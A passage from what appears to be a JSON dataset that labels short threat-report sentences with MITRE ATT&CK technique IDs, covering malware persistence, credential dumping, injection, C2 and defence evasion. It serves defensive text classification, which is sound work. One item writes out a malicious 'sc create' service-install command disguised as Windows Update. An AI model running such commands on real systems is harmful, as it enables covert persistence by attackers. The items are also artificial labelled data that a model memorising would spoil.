      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "An  Port 22 malware variant registers itself as a service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has collected system name OS version adapter information memory usage and disk information from a victim machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "If the C2 server is not active at this time, the download will fail and the victim will not receive a prompt to Enable Content as no macro is downloaded",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "created folders in temp directories to host collected files before exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "NavRAT is able to download and execute files located in the attachment of a received email",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "including adding more command-line arguments",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has utilized tools to aggregate data prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTPS and HTTP for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "have used previously acquired legitimate credentials prior to attacks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "gathers the MAC address of the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to persist using scheduled tasks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used reg.exe to create a Registry Run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "TClient is injected into dllhost.exe Malware Analysis wab32res.dll (FakeRun loader) loads TClient",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can gather extended system information including the hostname OS version number platform memory information time elapsed since system startup and CPU information.(Citation: PWC Cloud Hopper Technical Annex April 2017)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "utilizing comsvcs.dll",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32 to load malicious DLLs.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "opened it would initiate the download of a batch (.bat) file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32 during execution.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture.(Citation: Unit 42 CARROTBAT November 2018)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz being leveraged maliciously by threat actors in the following ways:\nCredential Loading\nMimikatz loads credentials from various sources such as Windows memory, Local Security Authority Subsystem Service (LSASS) process",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the username and hostname on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "searches for interesting files (either a default or customized set of file extensions) on the local system.  will scan the My Recent Documents Desktop Temporary Internet Files and TEMP directories.  also collects information stored in the Windows Address Book.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has batch files that modify the system service COMSysApp to load a malicious DLL.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files from its C2 via HTTP or DNS.(Citation: ClearSky Siamesekitten August 2021)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can list file and directory information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to exfiltrate documents from infected systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "A module in  collects information from the victim about Windows OS version computer name battery info and physical memory.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can write files to a compromised host.(Citation: PWC WellMess July 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect the host's IP addresses using the ipconfig command.(Citation: Securelist Dtrack)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "used voStro.exe a compiled pypykatz (Python version of ) to steal credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can download files onto compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The dropped executable (MD5) contains the compressed FELIXROOT dropper component in the Portable Executable (PE) binary overlay section",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used various API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives.(Citation: Kaspersky MoleRATs April 2019)(Citation: Unit42 Molerat Mar 2020)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised credentials to sign into victims Microsoft 365 accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "using a domain service account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "obtains the victim username and saves it to a file.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "searches for certain Registry keys to be configured before executing the payload.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has collected files and data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "used SCP to update the miner from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the\noperators were able to access their primary target via RDP connections",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to create the Registry key name EstsoftAutoUpdate at HKCU\\Software\\Microsoft/Windows\\CurrentVersion\\RunOnce to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has been executed using `rundll32.exe`.(Citation: ZScaler Squirrelwaffle Sep 2021)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has added a Registry key to ensure all future macros are enabled for Microsoft Word and Excel as well as for additional persistence.(Citation: Unit42 BabyShark Feb 2019)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "creates the following Registry entry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "server component is capable of opening a command terminal.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Lee 2013)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "stores output from command execution in a .dat file in the %TEMP% directory.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "contains the execFile function to execute a specified file on the system using the NSTask:launch method.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The sample, in the form of an RTF document, exploited CVE-2016-4117 to download and install a program from a remote C&C server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the lsass.exe beacon",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP and HTTPS for command and control communication.(Citation: Talos ROKRAT)(Citation: NCCGroup RokRat Nov 2018)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "adds Registry Run keys to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can deploy additional tools.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect the OS version and computer name from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence on a targeted host with scheduled tasks.(Citation: ClearSky Siamesekitten August 2021)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "One variant of  uses HTTP and HTTPS for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "collects information about the network including the IP address and DHCP server.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use a file exfiltration tool to copy files to C:\\ProgramData\\Adobe\\temp prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "creates a listener that listens for connections to port 443 at the path https://*:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can modify service configurations.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "then iterates over each volume to search for specific files related to virtual machines.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "had the ability to download additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "func_GetProcessor()",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collected MAC addresses from victim machines.(Citation: FireEye APT41 Aug 2019) ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "by gathering the username and",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "contains the getInstalledAPP function to run ls -la /Applications to gather what applications are installed.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by adding Registry Run keys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Use a previously compromised workstation admin account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The  installer loads a DLL using rundll32.(Citation: Microsoft Winnti Jan 2017)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "logicaldisk get caption,description,drivetype,providername,volumename",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can download files to the compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "queries Registry values as part of its anti-sandbox checks.(Citation: FinFisher Citation)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has performed process name checks and has monitored applications. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The attachment, if opened,",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to create a remote shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has lured victims into executing malicious macros embedded within Microsoft Office documents.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "deployed additional tools",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "acquires valid SSH accounts through brute force. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to gather the systems hostname and OS version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "malware can use cmd.exe to download and execute payloads and to execute commands on the system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "createTS—creates scheduled task. createLG—creates scheduled task at logon",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "During  additional payloads were downloaded after a target was infected with a first-stage downloader.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BCS-server tool connects to the designated C2 server via HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to open a remote shell and run basic commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has executed the ver command.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The  group is known to have used RDP during operations.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "the malware attempts to retrieve additional malicious artifacts",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "NavRAT then creates a registry key in order to execute this file copy at the next reboot of the system, an initial method of persistence",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Once loaded into memory  deletes the keyword_parm.txt and parm.txt configuration files from disk. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP and HTTPS for command and control.(Citation: Dell TG-3390)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can establish a LNK file in the startup folder for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to collect information about target machines.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "creates three Registry keys to establish persistence by adding a .",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "tries to start its defined shell which has been swapped to a batch script (file2.bat) by the malicious actor.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup.  also has the capability to invoke a reverse shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": ":\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use process hollowing for execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "terminates anti-malware processes if theyre found running on the system.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The task’s description is PythonUpdateSrvc and it runs either on Windows startup when a user logs in or when one of two system events get created:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can securely delete files including deleting itself from the victim.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Variants of  can communicate with C2 over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Disabling PowerShell logging",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The built-in Windows quser-command to show logged on users is also heavily used by them.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "ran as a Windows service from the c:\\windows\\syswow64 folder.(Citation: Check Point Sunburst Teardrop December 2020)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` for execution on compromised hosts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "sets up persistence with a Registry run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "to crawl through different paths in the system",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used batch scripts and scheduled tasks to delete critical system files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "adds itself to a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor by making a connection using a HTTP POST.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used `whoami` to collect system user information.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "If running as administrator  installs itself as a new service named bmwappushservice to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "which enables an HTTPS connection.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to download a file to the victim from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can gather the IP address from the victim's machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can gather the username from the victims machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "using the remote process execution tool PSExec to execute batch files",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "then executed RDPEnable on the infected machine.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The metadata included TA machine’s hostname,",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "injecting it to the address space of another process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Some  variants create a new Windows service to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "may create a file containing the results of the command cmd.exe /c ipconfig /all.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has added batch scripts to the startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.(Citation: Malwarebytes SmokeLoader 2016)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "utilizes comsvcs.dll to dump credentials from Local Security Authority Subsystem Service.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The Powershell script, when double clicked (executed),",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP/HTTPS for C2 traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors exfiltrated files and directories of interest from the targeted system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate local drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "constantly attempts to download and execute files from the remote C2 including  itself if not found on the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "saved malicious files within the AppData and Startup folders to maintain persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can check C2 connectivity with a `ping` to 8.8.8.8 (Google public DNS).",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "to execute various dropped tools or beacons on the endpoint,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to execute commands.(Citation: Lazarus RATANKBA)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "downloads several additional files and saves them to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can determine the IP and physical location of the compromised host via IPinfo.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "collected all network interface MAC addresses that are up and not loopback devices as well as IP address DHCP configuration and domain information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "It uses bat files",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP POST requests to communicate with its C2 server to receive commands. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can deliver trojanized versions of software and documents relying on user execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can download additional payloads to a compromised host. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can identify the OS version of a targeted system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can identify the IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can collect the GUID of a targeted machine.(Citation: ClearSky Siamesekitten August 2021)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "they used compromised workstation and domain admin accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can execute getinfo to enumerate the computer name and OS version of a compromised system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can browse directories on a compromised host.(Citation: Trend Micro DRBControl February 2020)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute previously staged shellcode payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The krbtgt account is a domain default account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can exfiltrate files from compromised systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the IP and domain of a target system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "collects system information from the victim including CPU speed computer name volume serial number ANSI code page OEM code page identifier for the OS Microsoft Windows version and memory information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the DLL was injected into the memory of the svchost.exe process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used ZwQueueApcThread to inject itself into remote processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "strings and the APIs used by",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The actors were able to proxy [T1090] RDP sessions,",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download files to target systems.(Citation: NCSC Cyclops Blink February 2022)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can launch a remote shell to execute arbitrary commands on the victims machine.(Citation: Cybereason Oceanlotus May 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "numerous batch (.bat) files on impacted systems",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "used the CreateFileW() API function with read permissions to access downloaded payloads. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The persistence technique is simply adding a run registry key for persistence",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "added the registry value ntdll to the Registry Run key to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has called the Windows API to retrieve the hard disk handle and shut down the machine.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "contains the getProcessList function to run ps aux to get running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP and HTTPS for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "use of WMI to both store and persist the backdoor",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can open an interactive command shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "running the malware sets itself up as the service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "then created a WMI event subscription in order to execute the\nbackdoor",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "and inject shellcode,",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The rest of MirageFox functions similarly to previous malware created by APT15, first collecting information about the computer like the username, CPU information, architecture, and so forth",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This allows it to download and deploy",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the injected Rundll32.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has a command to delete a file from the machine.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "to create a ImmediateTask",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Checking the number of processors",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "file downloads relating to tooling/scripts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Creation of syscall table for certain NT APIs.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "injected into notepad.exe, where the ransomware logic begins.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for command and control.(Citation: Moran 2013)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Stops the Microsoft Defender Antivirus Network Inspection Service (WdNisSvc)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Malicious service installation is accomplished via the below command line argument:\nsc create WindowsUpdate binPath= C:\\Windows\\Temp\\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use HTTP in C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used several Windows functions for various purposes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used Meterpreter to enumerate users on remote systems.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used a program named ff.exe to search for specific documents on compromised hosts.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "gathers information on users.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the adversary collected the data from various sources within the victim’s network.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": " has the ability to run cancel or closeanddeletestorage to remove all files from storage and delete the storage temp file on a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has communicated with C2 over HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "DEL Deletes a specified file",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "used the service control manager on a remote system to disable services associated with security monitoring products.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download and install a remote payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "reg.exe query",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has used the OutputDebugStringW function to avoid malware analysis as part of its anti-debugging technique. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Network adapter details are pulled via GetAdaptersAddresses",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional tools including  directly to endpoints.",
    "command": "",
